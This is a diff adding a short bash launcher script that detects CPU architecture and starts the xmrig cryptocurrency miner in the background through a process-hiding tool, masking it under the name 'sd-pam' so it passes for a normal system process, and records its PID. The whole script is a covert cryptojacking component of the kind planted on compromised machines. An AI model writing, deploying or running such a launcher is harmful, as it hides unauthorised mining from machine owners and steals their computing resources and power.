@@ -1,0 +1,15 @@
+#!/bin/bash
+
+proc=`grep "^core id" /proc/cpuinfo | sort -u | wc -l`
+ARCH=`uname -m`
+HIDE="sd-pam"
+vers="Napster"
+
+if [ "$ARCH" == "i686" ];       then
+        ./h32 -s $HIDE ./xmrig >>/dev/null &
+elif [ "$ARCH" == "x86_64" ];   then
+        ./h64 -s $HIDE ./xmrig >>/dev/null &
+                                else
+        ./h64 -s $HIDE ./xmrig >>/dev/null &
+fi
+echo $! > bash.pid
